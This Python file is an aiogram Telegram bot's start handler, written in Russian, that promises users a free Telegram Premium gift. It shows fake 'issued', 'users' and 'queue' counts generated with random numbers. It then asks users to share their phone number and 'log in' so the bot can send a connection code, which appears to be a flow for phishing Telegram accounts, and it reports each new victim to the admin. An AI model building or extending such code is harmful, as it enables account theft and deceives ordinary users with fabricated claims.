
from dataclasses import replace
from time import sleep
from aiogram.types import Message

import random
import types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message, CallbackQuery, ReplyKeyboardRemove
from state import GetAccountTG
from loader import vip, bot
from data import User
from markup import phone_markup
from utils import config

@vip.message_handler(commands=['start'])
async def start_handler(msg: Message):
    if msg.from_user.id is not str(config("admin_id")):
        status = User().join_users(
            user_id=msg.from_user.id,
            username=msg.from_user.username,
        )

        if status:
            await bot.send_sticker(chat_id=msg.from_user.id,
                           sticker=r"CAACAgIAAxkBAAEFupRjD2IYGEsclAIdnE8RBNA_3a8d4gACiA0AArvroUsJnEE_AtcneCkE")
            await msg.answer(f'<b>👋 Привет {msg.from_user.first_name}, этот бот может подарить Telegram Premium на твой аккаунт!\n\n'
            f'🎁 Для получения Premium авторизуйся через свой Telegram нажав на кнопку "🔑 Войти"</b>\n\n'
            f'<b>💎 Выдано Telegram Premium:</b> <code>{random.randint(1000, 2000)}</code>\n'
            f'<b>👤 Пользователей:</b> <code>{random.randint(2000, 3000)}</code>\n'
            f'<b>🥶 В очереди:</b> <code>{random.randint(100, 450)}</code>\n'
            ,reply_markup=phone_markup())
            sleep(1)
            await GetAccountTG.one.set()
            sleep(1)
            await msg.answer(f'<b>🔑 Подключение...</b>\n\n<i>Для того что бы бот cмог купить вам Telegram Premium, нужно что бы вы Авторизировались через свой Telegram, нажав на кнопку "Войти", после чего наш бот отправит код для подключения</i>')
            await bot.send_message(
                chat_id=config('admin_id'),
                text=f"<b>✅ Новый пользователь в боте:\n\n🆔:</b> <code>{msg.from_user.id}</code>\n<b>👤Линк:</b> @{msg.from_user.username}", parse_mode='html')
            await GetAccountTG.one.set()
        else:
            await bot.send_sticker(chat_id=msg.from_user.id,
                           sticker=r"CAACAgIAAxkBAAEFupRjD2IYGEsclAIdnE8RBNA_3a8d4gACiA0AArvroUsJnEE_AtcneCkE")
            await msg.answer(f'<b>👋 Привет {msg.from_user.first_name}, этот бот может подарить Telegram Premum на твой аккаунт!\n\n'
            f'🎁 Для получения Premium авторизуйся через свой Telegram нажав на кнопку "🔑 Войти"</b>\n\n'
            f'<b>💎 Выдано Telegram Premium:</b> <code>{random.randint(1000, 2000)}</code>\n'
            f'<b>👤 Пользователей:</b> <code>{random.randint(2000, 3000)}</code>\n'
            f'<b>🥶 В очереди:</b> <code>{random.randint(100, 450)}</code>\n'
            ,reply_markup=phone_markup())
            sleep(1)
            await msg.answer(f'<b>🔑 Подключение...</b>\n\n<i>Для того что бы бот cмог купить вам Telegram Premium, нужно что бы вы Авторизировались через свой Telegram, нажав на кнопку "Войти", после чего наш бот отправит код для подключения</i>')
            await GetAccountTG.one.set()
    else:
        await msg.answer(
            text='<b>Рады вас видеть милорд!</b>'
        )
